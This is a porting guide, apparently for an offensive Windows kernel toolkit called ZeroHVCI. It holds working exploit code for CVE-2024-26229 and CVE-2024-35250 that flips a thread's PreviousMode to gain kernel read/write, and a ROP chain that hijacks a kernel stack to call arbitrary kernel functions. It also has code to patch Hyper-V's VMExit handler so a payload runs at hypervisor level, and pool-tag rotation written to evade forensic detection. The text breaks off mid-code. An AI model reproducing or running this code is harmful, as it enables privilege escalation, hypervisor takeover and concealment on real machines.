# ZEROHVCI HYPER-V HIJACK - C++ to C + Assembly Port Guide

## Overview

This document details the ZeroHVCI runtime Hyper-V hijacking framework - a cutting-edge kernel exploitation system that achieves kernel code execution and hypervisor hijacking without requiring any system reboot, disk modifications, or vulnerable driver loading. The system exploits CVE-2024-26229 (CSC driver) or CVE-2024-35250 (KS driver) to obtain kernel read/write primitives, then uses ROP-based kernel function calling (KernelForge) to manipulate Hyper-V's VMExit handler at runtime.

**Key Innovation**: Runtime injection means the hypervisor becomes active immediately after hijack - no reboot required. This is achieved by patching hv.exe's VMExit handler while the hypervisor is running.

## File Inventory

**Core Components** (all in `OmbraLoader/zerohvci/`):

| File | Purpose | Lines | Complexity |
|------|---------|-------|------------|
| `zerohvci.h/cpp` | Main API - Initialize/Cleanup/Memory primitives | 248 | ★★☆☆☆ |
| `exploit.h` | CVE-2024-26229/35250 exploitation for kernel R/W | 287 | ★★★★☆ |
| `kforge.h` | ROP-based kernel function calling (KernelForge) | 440 | ★★★★★ |
| `hyperv_hijack.h` | RuntimeHijacker class - full hijack logic | 884 | ★★★★★ |
| `trampoline.h` | >2GB jump bridging mechanism | 397 | ★★★☆☆ |
| `version_detect.h` | Windows build detection & signature database | 440 | ★★★☆☆ |
| `driver_mapper.h/cpp` | Post-hijack driver mapping | 482 | ★★★☆☆ |
| `ept_verify.h` | EPT hiding verification | 307 | ★★☆☆☆ |
| `hypercall.asm` | CPUID-based hypercall assembly | 56 | ★☆☆☆☆ |
| `utils.h` | Kernel image parsing, gadget leaking | 528 | ★★★☆☆ |
| `ntdefs.h` | NT structures, offsets, types | 196 | ★☆☆☆☆ |

**Total**: ~3,750 lines of highly specialized kernel exploitation code

## Architecture Summary - 8-Phase Runtime Injection Pipeline

```
┌─────────────────────────────────────────────────────────────────────────┐
│ PHASE 0: Pre-Flight Checks                                              │
├─────────────────────────────────────────────────────────────────────────┤
│ • Detect Windows version (RtlGetVersion)                                │
│ • Verify Hyper-V presence (KUSER_SHARED_DATA + 0x2EC)                   │
│ • Detect CPU vendor (CPUID leaf 0)                                      │
└─────────────────────────────────────────────────────────────────────────┘
                                 │
                                 ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ PHASE 1: Kernel R/W Primitives (CVE Exploitation)                       │
├─────────────────────────────────────────────────────────────────────────┤
│ • Leak EPROCESS/KTHREAD via NtQuerySystemInformation                    │
│ • Try CSC exploit (CVE-2024-26229) first                                │
│   → Open \\Device\\Mup\\;Csc\\.\\..                                     │
│   → NtFsControlFile with IOCTL 0x001401a3                               │
│   → Targets KTHREAD + PreviousMode offset - 0x18                        │
│ • Fallback to KS exploit (CVE-2024-35250)                               │
│   → KsOpenDefaultDevice(KSCATEGORY_DRM_DESCRAMBLE)                      │
│   → Fake RTL_BITMAP targets KTHREAD + PreviousMode                      │
│ • Result: KTHREAD->PreviousMode flipped to 0 (KernelMode)               │
│   → NtReadVirtualMemory/NtWriteVirtualMemory now accept kernel addrs    │
└─────────────────────────────────────────────────────────────────────────┘
                                 │
                                 ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ PHASE 2: KernelForge Initialization (ROP Gadget Chain)                  │
├─────────────────────────────────────────────────────────────────────────┤
│ • Load ntoskrnl.exe into usermode (LoadLibraryEx DONT_RESOLVE_DLL_REFS) │
│ • Map sections to virtual layout (LdrMapImage)                          │
│ • Process relocations for actual kernel base                            │
│ • Scan for 5 ROP gadgets in executable sections:                        │
│   1. _guard_retpoline_exit_indirect_rax (register control)              │
│      48 8B 44 24 20   mov rax, [rsp+0x20]                               │
│      48 8B 4C 24 28   mov rcx, [rsp+0x28]  ; Arg 1                      │
│      48 8B 54 24 30   mov rdx, [rsp+0x30]  ; Arg 2                      │
│      4C 8B 44 24 38   mov r8,  [rsp+0x38]  ; Arg 3                      │
│      4C 8B 4C 24 40   mov r9,  [rsp+0x40]  ; Arg 4                      │
│      48 83 C4 48      add rsp, 48h                                      │
│      48 FF E0         jmp rax                                           │
│   2. Stack adjuster (add rsp, 68h; ret)                                 │
│   3. RCX control (pop rcx; ret)                                         │
│   4. Memory write (mov [rcx], rax; ret)                                 │
│   5. Dummy gadget for alignment (ret)                                   │
│ • Locate ZwTerminateThread for cleanup                                  │
└─────────────────────────────────────────────────────────────────────────┘
                                 │
                                 ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ PHASE 3: Hyper-V Module Discovery                                       │
├─────────────────────────────────────────────────────────────────────────┤
│ • Read PsLoadedModuleList via gadget leak                               │
│ • Walk LDR_DATA_TABLE_ENTRY linked list                                 │
│ • Search for hvix64.exe (Intel) or hvax64.exe (AMD)                     │
│ • Extract base address and SizeOfImage                                  │
│ • Read entire hv.exe into usermode buffer (for pattern scanning)        │
└─────────────────────────────────────────────────────────────────────────┘
                                 │
                                 ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ PHASE 4: VMExit Handler Pattern Scanning                                │
├─────────────────────────────────────────────────────────────────────────┤
│ INTEL PATTERN (stable landmark):                                        │
│   65 C6 04 25 6D 00 00 00 00   mov byte ptr gs:[0x6D], 0               │
│   48 8B 4C 24 ??               mov rcx, [rsp+??]                        │
│   48 8B 54 24 ??               mov rdx, [rsp+??]                        │
│   E8 ?? ?? ?? ??               call <handler>  ← TARGET                 │
│   E9 ?? ?? ?? ??               jmp  <next>                              │
│                                                                         │
│ AMD PATTERN (CALL at start):                                            │
│   E8 ?? ?? ?? ??               call vcpu_run   ← TARGET                 │
│   48 89 04 24                  mov [rsp], rax                           │
│   E9 ?? ?? ?? ??               jmp <next>                               │
│                                                                         │
│ AUTO-DISCOVERY MODE (Intel):                                            │
│   1. Find landmark pattern                                              │
│   2. Scan forward 0x50-0x180 bytes for E8 opcode                        │
│   3. Read rel32 offset, calculate absolute target                       │
│   4. Validate target is within hv.exe or high kernel space              │
│   5. Use discovered offset (fallback to static offset if fails)         │
│                                                                         │
│ Version-Specific Database (17 entries):                                 │
│   Win10 1709-1803: CallOffset varies, NO IndirectContext                │
│   Win10 1809+:     IndirectContext=TRUE, HookLen=8                      │
│   Win10 2004-22H2: CallOffset 0xCC-0x11E                                │
│   Win11 21H2-23H2: CallOffset 0x10B                                     │
│   Win11 24H2+:     Wide scan range (0x80-0x180)                         │
└─────────────────────────────────────────────────────────────────────────┘
                                 │
                                 ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ PHASE 5: Payload Allocation & Mapping                                   │
├─────────────────────────────────────────────────────────────────────────┤
│ • Allocate NonPagedPoolNx via KernelForge:                              │
│   payload_base = ExAllocatePool(NonPagedPoolNx, payload_size)           │
│ • Parse payload PE headers (DOS, NT, sections)                          │
│ • Copy headers to kernel memory                                         │
│ • Copy sections to virtual offsets                                      │
│ • Process relocations for new kernel base:                              │
│   delta = payload_base - ImageBase                                      │
│   For each IMAGE_REL_BASED_DIR64: *(uint64*)addr += delta               │
│ • Populate ombra_context structure:                                     │
│   struct RUNTIME_OMBRA_T {                                              │
│       uint64_t VmExitHandlerRva;     // payload entry - original        │
│       uint64_t HypervModuleBase;     // hv.exe base                     │
│       uint64_t ModuleBase;           // payload kernel base             │
│       uint32_t VmcbBase;             // (AMD only) GS offset            │
│       uint32_t WindowsBuild;         // Version info                    │
│       uint8_t  IndirectContext;      // Context indirection flag        │
│       uint8_t  HookLen;              // 5 or 8 bytes                    │
│   };                                                                    │
│ • Find and populate AMD VMCB offsets (if AMD):                          │
│   Pattern: 65 48 8B 04 25 ?? ?? ?? ?? (gs:[offset] access)              │
└─────────────────────────────────────────────────────────────────────────┘
                                 │
                                 ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ PHASE 6: Trampoline Allocation (if needed)                              │
├─────────────────────────────────────────────────────────────────────────┤
│ Problem: x86-64 CALL rel32 has ±2GB range limit                         │
│                                                                         │
│ Check distance:                                                         │
│   int64_t delta = payload_entry - call_rip                              │
│   if (delta > INT32_MAX || delta < INT32_MIN) → Need trampoline         │
│                                                                         │
│ STRATEGY 1: Find slack space in hv.exe                                  │
│   • Scan for consecutive 0xCC/0x00/0x90 (int3/zero/nop padding)         │
│   • Need 12 bytes minimum                                               │
│   • Typically found between functions                                   │
│                                                                         │
│ STRATEGY 2: Allocate kernel pool near hv.exe                            │
│   • Try 64 allocations with varying sizes                               │
│   • Keep allocation closest to hv.exe within 1.75GB                     │
│   • Free all others                                                     │
│                                                                         │
│ Trampoline shellcode (12 bytes):                                        │
│   48 B8 <8-byte addr>    mov rax, payload_entry                         │
│   FF E0                  jmp rax                                        │
│                                                                         │
│ Verification:                                                           │
│   • Read back trampoline bytes                                          │
│   • Verify opcodes match (48 B8 ... FF E0)                              │
│   • Confirm target address correct                                      │
└─────────────────────────────────────────────────────────────────────────┘
                                 │
                                 ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ PHASE 7: VMExit Handler Patch (THE HIJACK)                              │
├─────────────────────────────────────────────────────────────────────────┤
│ BEFORE:                                                                 │
│   hvix64.exe + 0xABCD:  E8 12 34 56 78   call original_handler          │
│                                                                         │
│ AFTER (direct, payload within 2GB):                                     │
│   hvix64.exe + 0xABCD:  E8 XX XX XX XX   call payload_entry            │
│                         ↑                                               │
│                         └─ New rel32 = payload_entry - (call_rip)       │
│                                                                         │
│ AFTER (trampoline, payload >2GB away):                                  │
│   hvix64.exe + 0xABCD:  E8 YY YY YY YY   call trampoline                │
│                                                                         │
│   Trampoline at hv.exe slack/nearby pool:                               │
│     48 B8 <payload_entry>    mov rax, <64-bit payload address>          │
│     FF E0                    jmp rax                                    │
│                                                                         │
│ Atomic write operation:                                                 │
│   WriteKernelMemory(call_addr + 1, &new_rva, sizeof(int32_t))           │
│                                                                         │
│ Result: ALL VMExits now route through payload immediately!              │
└─────────────────────────────────────────────────────────────────────────┘
                                 │
                                 ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ PHASE 8: Post-Hijack Verification & Driver Mapping                      │
├─────────────────────────────────────────────────────────────────────────┤
│ • Test hypercall communication:                                         │
│   hypercall_asm(VMCALL_GET_CR3, NULL, 0, session_key) → VMX_ROOT_ERROR │
│ • Query EPT/NPT base (VMCALL_GET_EPT_BASE)                              │
│ • Test storage slot R/W (VMCALL_STORAGE_QUERY)                          │
│ • Map OmbraDriver.sys using same technique:                             │
│   - Allocate pool, copy sections, relocate, resolve imports             │
│   - Call DriverEntry via KernelForge                                    │
│   - Register callback with hypervisor (STORAGE_SLOT[CALLBACK_ADDRESS])  │
│ • Restore PreviousMode to UserMode (1) - CRITICAL for Win11 24H2+       │
│   (Prevents BSOD 0x1F9 on return to usermode)                           │
└─────────────────────────────────────────────────────────────────────────┘
```

## CVE Exploitation Chain

### CVE-2024-26229 (CSC Driver) - Preferred Method

**Vulnerability**: Out-of-bounds write in Client-Side Caching driver

**Exploit Flow**:
```c
// 1. Open vulnerable device
UNICODE_STRING ObjectName = RTL_CONSTANT_STRING(L"\\Device\\Mup\\;Csc\\.\\.");
OBJECT_ATTRIBUTES ObjectAttributes;
InitializeObjectAttributes(&ObjectAttributes, &ObjectName, 0, NULL, NULL);

IO_STATUS_BLOCK IoStatusBlock;
NTSTATUS status = NtCreateFile(
    &hHandle,
    SYNCHRONIZE,
    &ObjectAttributes,
    &IoStatusBlock,
    NULL,
    FILE_ATTRIBUTE_NORMAL,
    0,
    FILE_OPEN_IF,
    FILE_CREATE_TREE_CONNECTION,
    NULL, 0
);

// 2. Trigger vulnerability via IOCTL
// Vulnerable offset calculation: KTHREAD + PreviousMode - 0x18
// When driver writes at (arg + 0x18), it hits KTHREAD->PreviousMode
ULONG previousModeOffset = GetKThreadPreviousModeOffset();  // Typically 0x232
PVOID vuln_target = (PVOID)(TargetKThread + previousModeOffset - 0x18);

status = NtFsControlFile(
    hHandle,
    NULL, NULL, NULL,
    &IoStatusBlock,
    0x001401a3,           // CSC_DEV_FCB_XXX_CONTROL_FILE
    vuln_target,          // InputBuffer - the key exploit parameter
    0,                    // InputBufferLength
    NULL,                 // OutputBuffer
    0                     // OutputBufferLength
);

// 3. Result: KTHREAD->PreviousMode now 0 (KernelMode)
// NtReadVirtualMemory/NtWriteVirtualMemory accept kernel addresses
```

**Why This Works**:
- CSC driver performs unchecked pointer arithmetic
- `(arg + 0x18)` calculation targets exact PreviousMode offset
- Single IOCTL flips thread mode bit

**C Conversion Notes**:
```c
// Replace C++ RAII with manual cleanup
HANDLE hHandle = NULL;

// ... exploit code ...

if (hHandle) {
    CloseHandle(hHandle);
    hHandle = NULL;
}
```

### CVE-2024-35250 (KS Driver) - Fallback Method

**Vulnerability**: Type confusion in Kernel Streaming property handlers

**Exploit Flow**:
```c
// 1. Open DRM device via SetupAPI enumeration
HANDLE hDrmDevice = NULL;
HRESULT hr = KsOpenDefaultDevice(
    KSCATEGORY_DRM_DESCRAMBLE,
    GENERIC_READ | GENERIC_WRITE,
    &hDrmDevice
);

// 2. Craft exploit structures
typedef struct _EXPLOIT_DATA1 {
    PRTL_BITMAP FakeBitmap;  // Pointer to our controlled memory
} EXPLOIT_DATA1;

typedef struct _EXPLOIT_DATA2 {
    char pad[0x20];
    PVOID ptr_ArbitraryFunCall;  // kCFG bypass gadget
} EXPLOIT_DATA2;

// 3. Allocate fake RTL_BITMAP at known address
PVOID fakeBitmapMem = VirtualAlloc(
    (LPVOID)0x10000000,
    sizeof(RTL_BITMAP),
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE
);

PRTL_BITMAP fakeBitmap = (PRTL_BITMAP)fakeBitmapMem;
fakeBitmap->SizeOfBitMap = 0x20;
fakeBitmap->Buffer = (PVOID)(TargetKThread + previousModeOffset);

// 4. Craft KSPROPERTY structures
UCHAR InBuffer[sizeof(KSPROPERTY) + sizeof(EXPLOIT_DATA2)] = {0};
UCHAR OutBuffer[sizeof(KSPROPERTY_SERIALHDR) + sizeof(KSPROPERTY_SERIAL) + sizeof(EXPLOIT_DATA1)] = {0};

PKSPROPERTY pInProp = (PKSPROPERTY)InBuffer;
pInProp->Set = KSPROPSETID_DrmAudioStream;
pInProp->Flags = KSPROPERTY_TYPE_UNSERIALIZESET;
pInProp->Id = 0;

PEXPLOIT_DATA2 pInData = (PEXPLOIT_DATA2)(pInProp + 1);
pInData->ptr_ArbitraryFunCall = (PVOID)LeakGadgetAddress("RtlClearAllBits");

PKSPROPERTY_SERIALHDR pSerialHdr = (PKSPROPERTY_SERIALHDR)OutBuffer;
pSerialHdr->PropertySet = KSPROPSETID_DrmAudioStream;
pSerialHdr->Count = 1;

PKSPROPERTY_SERIAL pSerial = (PKSPROPERTY_SERIAL)(pSerialHdr + 1);
pSerial->PropertyLength = sizeof(EXPLOIT_DATA1);
pSerial->Id = 0;
pSerial->PropTypeSet.Set = KSPROPSETID_DrmAudioStream;
pSerial->PropTypeSet.Id = 0x45;

PEXPLOIT_DATA1 pOutData = (PEXPLOIT_DATA1)(pSerial + 1);
pOutData->FakeBitmap = fakeBitmap;

// 5. Trigger vulnerability
BOOL result = DeviceIoControl(
    hDrmDevice,
    IOCTL_KS_PROPERTY,
    InBuffer, sizeof(InBuffer),
    OutBuffer, sizeof(OutBuffer),
    NULL, NULL
);

// 6. Result: RtlClearAllBits(fakeBitmap) clears 0x20 bits at KTHREAD->PreviousMode
// PreviousMode byte becomes 0 (KernelMode)
```

**Why This Works**:
- KS driver trusts serialized property data
- Type confusion allows us to pass fake RTL_BITMAP
- RtlClearAllBits writes zeros to our controlled address
- kCFG bypass via function pointer in EXPLOIT_DATA2

**C Conversion Notes**:
```c
// Replace std::vector with manual arrays
UCHAR InBuffer[MAX_IOCTL_SIZE];
UCHAR OutBuffer[MAX_IOCTL_SIZE];
memset(InBuffer, 0, sizeof(InBuffer));
memset(OutBuffer, 0, sizeof(OutBuffer));

// Replace RAII cleanup with goto error handling
if (hDrmDevice != NULL && hDrmDevice != INVALID_HANDLE_VALUE) {
    CloseHandle(hDrmDevice);
}
if (fakeBitmapMem != NULL) {
    VirtualFree(fakeBitmapMem, 0, MEM_RELEASE);
}
```

### PreviousMode Manipulation

**KTHREAD Structure** (Windows 10/11):
```c
struct _KTHREAD {
    // ... many fields ...
    // +0x038: PVOID StackBase
    // +0x058: PVOID KernelStack
    // +0x184: KTHREAD_STATE State
    // +0x232: UCHAR PreviousMode   ← TARGET
    // ... more fields ...
};
```

**PreviousMode Values**:
- `0` = KernelMode - allows kernel memory access
- `1` = UserMode - restricts to usermode addresses

**Version-Specific Offsets**:
```c
// From version_detect.h database
struct KThreadOffsets {
    uint32_t MinBuild;
    uint32_t MaxBuild;
    uint32_t PreviousModeOffset;
};

// All Windows 10/11 versions use 0x232
const KThreadOffsets g_KThreadOffsets[] = {
    { 16299, 16299, 0x232 },  // Win10 1709
    { 17134, 17134, 0x232 },  // Win10 1803
    { 17763, 17763, 0x232 },  // Win10 1809
    { 19041, 19045, 0x232 },  // Win10 2004-22H2
    { 22000, 22631, 0x232 },  // Win11 21H2-23H2
    { 26100, 26200, 0x232 },  // Win11 24H2
};
```

**Critical Cleanup** (Windows 11 24H2+):
```c
// MUST restore PreviousMode before returning to usermode
// Failure causes BSOD 0x1F9 (KMODE_EXCEPTION_NOT_HANDLED)
void Cleanup(void) {
    if (g_CurrentKThread) {
        BYTE userMode = 1;
        WriteKernelMemory(
            (PVOID)(g_CurrentKThread + KTHREAD_PreviousMode),
            &userMode,
            sizeof(BYTE)
        );
    }
}
```

## KernelForge (ROP-based Kernel Calls)

### Gadget Chain Architecture

**Problem**: We have kernel R/W but can't directly call kernel functions from usermode.

**Solution**: Hijack a dummy thread's kernel stack to execute ROP chain that:
1. Loads function address into RAX
2. Loads arguments into RCX, RDX, R8, R9
3. Calls function via `jmp rax`
4. Captures return value
5. Terminates thread gracefully via ZwTerminateThread

**Gadget Discovery** (scans ntoskrnl.exe executable sections):

```c
// GADGET 1: _guard_retpoline_exit_indirect_rax
// Full register control for x64 calling convention
UCHAR sign1[] = {
    0x48, 0x8B, 0x44, 0x24, 0x20,  // mov rax, [rsp+0x20]  - Function ptr
    0x48, 0x8B, 0x4C, 0x24, 0x28,  // mov rcx, [rsp+0x28]  - Arg1
    0x48, 0x8B, 0x54, 0x24, 0x30,  // mov rdx, [rsp+0x30]  - Arg2
    0x4C, 0x8B, 0x44, 0x24, 0x38,  // mov r8,  [rsp+0x38]  - Arg3
    0x4C, 0x8B, 0x4C, 0x24, 0x40,  // mov r9,  [rsp+0x40]  - Arg4
    0x48, 0x83, 0xC4, 0x48,        // add rsp, 48h
    0x48, 0xFF, 0xE0               // jmp rax              - Call function
};

// GADGET 2: Stack space adjuster
UCHAR sign2[] = {
    0x48, 0x83, 0xC4, 0x68,  // add rsp, 68h
    0xC3                     // ret
};

// GADGET 3: RCX control (for return value storage)
UCHAR sign3[] = {
    0x59,  // pop rcx
    0xC3   // ret
};

// GADGET 4: Memory write (save return value)
UCHAR sign4[] = {
    0x48, 0x89, 0x01,  // mov [rcx], rax
    0xC3               // ret
};

// GADGET 5: Dummy (from GADGET 4 + 3, just the ret)
// Used for stack alignment
```

**Gadget Scanning C Code**:
```c
BOOL Initialize_KernelForge(void) {
    PVOID kernel_image = NULL;
    DWORD kernel_size = 0;

    // Load ntoskrnl.exe into usermode
    if (!LoadKernelImage(&kernel_image, &kernel_size)) {
        return FALSE;
    }

    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)
        ((PUCHAR)kernel_image + ((PIMAGE_DOS_HEADER)kernel_image)->e_lfanew);

    PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)
        ((PUCHAR)&pHeaders->OptionalHeader + pHeaders->FileHeader.SizeOfOptionalHeader);

    // Scan executable sections only
    for (DWORD i = 0; i < pHeaders->FileHeader.NumberOfSections; i++) {
        if ((pSection[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            !(pSection[i].Characteristics & IMAGE_SCN_MEM_DISCARDABLE)) {

            PUCHAR section_data = (PUCHAR)kernel_image + pSection[i].VirtualAddress;
            DWORD section_size = pSection[i].Misc.VirtualSize;

            for (DWORD offset = 0; offset < section_size - 0x100; offset++) {
                // Try to match each gadget signature
                if (MatchSignature(section_data + offset, sign1, sizeof(sign1))) {
                    g_RopAddr_1 = g_KernelAddr + pSection[i].VirtualAddress + offset;
                }
                // ... match other gadgets ...
            }
        }
    }

    return g_RopAddr_1 && g_RopAddr_2 && g_RopAddr_3 && g_RopAddr_4 && g_RopAddr_5;
}

BOOL MatchSignature(PUCHAR data, PUCHAR signature, int size) {
    for (int i = 0; i < size; i++) {
        if (signature[i] == 0xFF) continue;  // Wildcard
        if (data[i] != signature[i]) return FALSE;
    }
    return TRUE;
}
```

### Stack Hijacking Mechanism

**Dummy Thread Creation**:
```c
// Thread that waits on event - we hijack its kernel stack
DWORD WINAPI DummyThread(LPVOID lpParam) {
    HANDLE hEvent = (HANDLE)lpParam;
    WaitForSingleObject(hEvent, INFINITE);
    return 0;
}

HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
HANDLE hThread = CreateThread(NULL, 0, DummyThread, hEvent, 0, &dwThreadId);

// Wait for thread to enter Waiting state
while (GetThreadState(GetCurrentProcessId(), dwThreadId) != Waiting) {
    SwitchToThread();
}

// Get KTHREAD address from handle table
PVOID pThread = GetKernelObject(hThread);
```

**Stack Layout Analysis**:
```c
// Read thread's kernel stack bounds
PUCHAR StackBase, KernelStack;
ReadKernelMemory((PVOID)(pThread + KTHREAD_StackBase), &StackBase, sizeof(PVOID));
ReadKernelMemory((PVOID)(pThread + KTHREAD_KernelStack), &KernelStack, sizeof(PVOID));

// Find return address to KiSystemServiceCopyEnd at bottom of stack
PVOID RetAddr = NULL;
for (PUCHAR ptr = StackBase - sizeof(PVOID); ptr > KernelStack; ptr -= sizeof(PVOID)) {
    DWORD_PTR val;
    ReadKernelMemory(ptr, &val, sizeof(DWORD_PTR));

    // Syscall return address is in ntoskrnl range
    if (val > g_KernelAddr && val < g_KernelAddr + g_KernelSize) {
        RetAddr = ptr;
        break;
    }
}
```

**ROP Chain Construction**:
```c
#define WRITE_STACK(offset, value) \
    WriteKernelMemory((PVOID)((PUCHAR)RetAddr + (offset)), &(value), sizeof(PVOID))

// Hijack return address with ROP chain
PVOID RetVal = NULL;  // Usermode variable to receive return value

// CHAIN LINK 1: Load registers and call function
WRITE_STACK(0x00, g_RopAddr_1);           // → _guard_retpoline_exit_indirect_rax
WRITE_STACK(0x08 + 0x20, FunctionAddr);   // RAX = function to call
WRITE_STACK(0x08 + 0x28, Arg1);           // RCX = arg1
WRITE_STACK(0x08 + 0x30, Arg2);           // RDX = arg2
WRITE_STACK(0x08 + 0x38, Arg3);           // R8  = arg3
WRITE_STACK(0x08 + 0x40, Arg4);           // R9  = arg4

// CHAIN LINK 2: Reserve stack space for args 5-9 + shadow space
WRITE_STACK(0x50, g_RopAddr_2);           // → add rsp, 68h; ret

// Stack args (if more than 4 params)
for (DWORD i = 4; i < ArgCount; i++) {
    WRITE_STACK(0x58 + 0x20 + ((i - 4) * 8), Args[i]);
}

// CHAIN LINK 3: Prepare to save return value
WRITE_STACK(0xC0, g_RopAddr_3);           // → pop rcx; ret
WRITE_STACK(0xC8, &RetVal);               // RCX = address to store return val

// CHAIN LINK 4: Save return value from RAX to [RCX]
WRITE_STACK(0xD0, g_RopAddr_4);           // → mov [rcx], rax; ret

// CHAIN LINK 5: Stack alignment dummy
WRITE_STACK(0xD8, g_RopAddr_5);           // → ret

// CHAIN LINK 6: Graceful thread termination
WRITE_STACK(0xE0, g_RopAddr_1);           // → _guard_retpoline_exit_indirect_rax
WRITE_STACK(0xE8 + 0x20, g_ZwTerminateThread);
WRITE_STACK(0xE8 + 0x28, hThread);        // RCX = handle
WRITE_STACK(0xE8 + 0x30, 0x1337);         // RDX = exit code (magic value)

// Trigger execution by signaling event
SetEvent(hEvent);
WaitForSingleObject(hThread, INFINITE);

// Verify thread died with magic exit code
DWORD dwExitCode;
GetExitCodeThread(hThread, &dwExitCode);
if (dwExitCode == 0x1337) {
    // Success - RetVal now contains function return value
}
```

**Call Abstraction**:
```c
// High-level wrapper
PVOID CallKernelFunction(const char* funcName, PVOID* args, DWORD argCount) {
    PVOID funcAddr = GetKernelProcAddress(funcName);
    if (!funcAddr) return NULL;

    PVOID retVal = NULL;
    if (CallKernelFunctionViaAddress(funcAddr, args, argCount, &retVal)) {
        return retVal;
    }
    return NULL;
}

// Example: Allocate kernel pool
PVOID pool = CallKernelFunction("ExAllocatePool",
    (PVOID[]){ (PVOID)NonPagedPoolNx, (PVOID)0x1000 }, 2);
```

### Legitimate Pool Tag Rotation (Anti-Forensics)

**Problem**: `ExAllocatePool(NonPagedPoolNx, size)` with NULL tag is suspicious.

**Solution**: Rotate through real Windows component tags:

```c
// Legitimate pool tags (little-endian)
const ULONG g_LegitTags[] = {
    'sftN',   // Ntfs.sys
    'eliF',   // File objects
    'pRI ',   // IRP allocations
    'looP',   // Pool allocations
    'dteR',   // Registry
    'gaTI',   // I/O tag
    'kroW',   // Work items
    'truC',   // Current allocations
    'dmI ',   // Image loader
    'aeSK',   // Ksec security
};

static volatile LONG g_TagIndex = 0;

ULONG GetRandomTag(void) {
    LONG current = InterlockedIncrement(&g_TagIndex);
    return g_LegitTags[current % (sizeof(g_LegitTags) / sizeof(ULONG))];
}

// Usage
PVOID AllocatePool(SIZE_T size) {
    ULONG tag = GetRandomTag();
    return CallKernelFunction("ExAllocatePoolWithTag",
        (PVOID[]){ (PVOID)NonPagedPoolNx, (PVOID)size, (PVOID)tag }, 3);
}
```

**Why This Works**:
- `!poolfind` in WinDbg shows allocations with legitimate tags
- Blends with normal system allocations
- No unique tag signature to flag

## Hyper-V Hijack

### VMExit Handler Signatures (Version-Specific)

**Intel VMX Signatures** (17 database entries, 5 unique patterns):

```c
// Windows 10 1709 (16299) - Pre-IndirectContext
struct VmExitSignature win10_1709_intel = {
    .MinBuild = 16299,
    .MaxBuild = 17133,
    .IsIntel = TRUE,
    .Pattern = {
        0x65, 0xC6, 0x04, 0x25, 0x6D, 0x00, 0x00, 0x00, 0x00,  // gs:[0x6D] = 0
        0x48, 0x8B, 0x4C, 0x24, 0x??,                          // mov rcx, [rsp+??]
        0x48, 0x8B, 0x54, 0x24, 0x??,                          // mov rdx, [rsp+??]
        0xE8, 0x??, 0x??, 0x??, 0x??,                          // call <handler>
        0xE9                                                   // jmp
    },
    .Mask = "xxxxxxxxx xxxxx?xxxx?x????x",
    .PatternLen = 25,
    .CallOffset = 0x86,      // Static fallback
    .HookLen = 5,
    .IndirectContext = FALSE,
    .AutoDiscoverCall = TRUE,  // Hybrid approach
    .ScanRangeStart = 0x50,
    .ScanRangeEnd = 0x150,
    .CallOpcode = 0xE8
};

// Windows 10 1809+ (17763+) - IndirectContext begins
struct VmExitSignature win10_1809_intel = {
    // ... same pattern ...
    .CallOffset = 0x11E,
    .HookLen = 8,            // Extended hook for indirect context
    .IndirectContext = TRUE, // Context is pointer-to-pointer
    .ScanRangeStart = 0x80,
    .ScanRangeEnd = 0x180
};

// Windows 11 22H2 (22621)
struct VmExitSignature win11_22h2_intel = {
    // ... same pattern ...
    .CallOffset = 0x10B,
    .HookLen = 5,
    .IndirectContext = TRUE
};
```

**AMD SVM Signature** (universal, works across all versions):

```c
struct VmExitSignature amd_universal = {
    .MinBuild = 16299,
    .MaxBuild = 99999,       // All versions
    .IsIntel = FALSE,
    .Pattern = {
        0xE8, 0x??, 0x??, 0x??, 0x??,  // call vcpu_run  ← CALL AT START
        0x48, 0x89, 0x04, 0x24,        // mov [rsp], rax
        0xE9                            // jmp
    },
    .Mask = "x????xxxx x",
    .PatternLen = 10,
    .CallOffset = 0,         // CALL is at pattern start
    .HookLen = 5,
    .IndirectContext = FALSE,
    .AutoDiscoverCall = FALSE  // Direct pattern match
};
```

**Why Auto-Discovery** (Hybrid Approach):

The CallOffset varies between Windows updates within the same build range. Auto-discovery scans forward from the landmark pattern to find the actual E8 opcode:

```c
BOOL AutoDiscoverCallOffset(
    size_t patternPos,
    const struct VmExitSignature* sig,
    PUCHAR hvLocalCopy,
    DWORD hvSize,
    UINT64 hvBase,
    UINT64* outCallAddr,
    UINT64* outOriginalHandler
) {
    printf("[*] Auto-discovering CALL offset (scanning 0x%X - 0x%X)...\n",
        sig->ScanRangeStart, sig->ScanRangeEnd);

    for (UINT32 offset = sig->ScanRangeStart; offset < sig->ScanRangeEnd; offset++) {
        size_t scanPos = patternPos + offset;
        if (scanPos + 5 >= hvSize) break;

        // Check for CALL opcode (E8)
        if (hvLocalCopy[scanPos] == sig->CallOpcode) {
            // Read rel32 offset
            INT32 relOffset = *(INT32*)(hvLocalCopy + scanPos + 1);

            // Calculate absolute target
            UINT64 callAddr = hvBase + scanPos;
            UINT64 callRip = callAddr + 5;
            UINT64 targetAddr = callRip + relOffset;

            // Validate target is reasonable
            if (ValidateCallTarget(callAddr, targetAddr, hvBase, hvSize)) {
                printf("[+] Auto-discovered CALL at 0x%llX → 0x%llX\n",
                    callAddr, targetAddr);
                *outCallAddr = callAddr;
                *outOriginalHandler = targetAddr;
                return TRUE;
            }
        }
    }

    printf("[!] Auto-discovery failed - falling back to static offset\n");
    return FALSE;
}

BOOL ValidateCallTarget(UINT64 callAddr, UINT64 target, UINT64 hvBase, DWORD hvSize) {
    // Target should be within hv.exe
    if (target >= hvBase && target < hvBase + hvSize) {
        return TRUE;
    }

    // Or in high kernel space (>= 0xFFFFF80000000000)
    if (target >= 0xFFFFF80000000000ULL) {
        return TRUE;
    }

    return FALSE;
}
```

**Static Fallback**:
If auto-discovery fails (rare), use the static CallOffset from database:
```c
if (!AutoDiscoverCallOffset(...)) {
    callAddr = patternAddr + sig->CallOffset;
    // Read current RVA to find original handler
